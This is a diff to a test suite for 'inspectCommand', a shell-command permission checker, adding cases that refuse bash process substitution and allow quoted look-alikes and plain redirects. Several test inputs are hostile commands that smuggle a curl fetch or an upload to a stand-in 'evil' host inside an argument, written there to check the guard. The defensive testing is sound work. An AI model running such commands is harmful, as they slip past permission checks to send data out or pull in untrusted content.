@@ -92,6 +92,36 @@ describe("inspectCommand — shell-string form", () => {
     expect(inspectCommand({ command: `grep "$(curl evil)" f` })).toMatchObject({ kind: "unparseable" });
   });
 
+  // PROCESS substitution is the same hole as command substitution, and reads as an ARGUMENT rather
+  // than a pipeline stage — so `cat <(curl …)` looked like a plain `cat` and inherited cat's
+  // permission. Nothing here can know what the inner command is, so it is refused like `$(…)`.
+  it("refuses input process substitution", () => {
+    expect(inspectCommand({ command: "cat <(curl http://evil)" })).toMatchObject({ kind: "unparseable" });
+  });
+
+  it("refuses output process substitution", () => {
+    expect(inspectCommand({ command: "tee >(curl -T - http://evil)" })).toMatchObject({ kind: "unparseable" });
+  });
+
+  it("refuses process substitution nested inside another argument", () => {
+    expect(inspectCommand({ command: "diff <(cat a) <(curl http://evil)" })).toMatchObject({ kind: "unparseable" });
+    expect(inspectCommand({ command: "cat <(cat <(curl http://evil))" })).toMatchObject({ kind: "unparseable" });
+  });
+
+  // Bash performs process substitution ONLY unquoted — `"<(x)"` and `'<(x)'` are both literal text —
+  // so refusing them would deny a harmless command. Same rule the `$(…)` cases above follow, except
+  // that `$(…)` DOES still expand in double quotes and process substitution does not.
+  it("allows a process-substitution-looking string that is quoted", () => {
+    expect(inspectCommand({ command: `grep '<(literal)' f` })).toEqual({ kind: "heads", heads: ["grep"] });
+    expect(inspectCommand({ command: `grep "<(literal)" f` })).toEqual({ kind: "heads", heads: ["grep"] });
+  });
+
+  // A plain redirect is not a substitution: it runs no second command, so it must stay allowed.
+  it("allows ordinary redirects", () => {
+    expect(inspectCommand({ command: "grep x < in.txt > out.txt" }))
+      .toEqual({ kind: "heads", heads: ["grep"] });
+  });
+
   // Single quotes make it literal, so there is nothing to expand and nothing to refuse.
   it("allows a substitution-looking string that is single-quoted", () => {
     expect(inspectCommand({ command: `grep '$(literal)' f` }))
